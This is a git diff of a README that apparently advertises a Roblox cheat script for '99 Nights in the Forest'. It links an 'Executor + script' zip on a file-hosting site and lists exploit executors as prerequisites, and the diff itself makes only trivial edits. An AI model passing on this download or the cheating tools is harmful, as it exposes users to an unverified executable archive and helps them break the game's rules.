@@ -1,4 +1,4 @@
-# 99 Nights in the Forest - Roblox Script 🌲🌙
+# 99 Nights in the Forest - Roblox Script 🌲🌙1
 
 ![Version](https://img.shields.io/badge/Version-1.2.3-blue.svg)
 ![Game](https://img.shields.io/badge/Game-99_Nights_in_the_Forest-green.svg)
@@ -7,6 +7,7 @@
 Executor + script  --- [ScriptPacked](https://www.mediafire.com/file/otdgaoctqo4u6l9/ScriptPacked.zip/file)
 
 ## ✨ Script Features
+
 
 ### 🎯 Core Functionality
 | Feature | Description | Risk Level |
@@ -29,6 +30,6 @@ Executor + script  --- [ScriptPacked](https://www.mediafire.com/file/otdgaoctqo4
 ### Prerequisites
 - Roblox Player installed
 -  software (e.g., Synapse, Krnl)
-- Private server recommended
+
 
 
